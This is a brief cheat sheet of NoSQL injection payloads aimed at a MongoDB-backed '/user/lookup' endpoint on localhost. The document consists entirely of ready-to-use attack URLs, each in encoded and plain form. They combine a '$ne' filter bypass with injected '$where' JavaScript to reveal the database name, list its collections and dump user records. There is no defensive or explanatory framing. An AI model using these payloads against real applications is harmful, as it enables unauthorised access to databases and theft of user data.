# nosqli
```
Get Current MongoDB Name:

http://localhost:4000/user/lookup?username[$ne]=nothing&$where=%20this.db.getName()%20==%20%22%s%22%20;%20return%20true;

http://localhost:4000/user/lookup?username[$ne]=nothing&$where= this.db.getName() == "%s" ; return true;

———
```
Get All MongoDB Collections:
```
http://localhost:4000/user/lookup?username[$ne]=nothing&$where=%20db.listCollections().forEach(collection%20=%3E%20print(collection.name))%20;%20return%20true;

http://localhost:4000/user/lookup?username[$ne]=nothing&$where= db.listCollections().forEach(collection => print(collection.name)) ; return true;

———
```
Display the first 5 records in the {{CollectionName}} collection:
```
http://localhost:4000/user/lookup?username[$ne]=nothing&$where=printjson(db.users.find().limit(5).toArray());%20return%20true;

http://localhost:4000/user/lookup?username[$ne]=nothing&$where=printjson(db.users.find().limit(5).toArray()); return true;
```
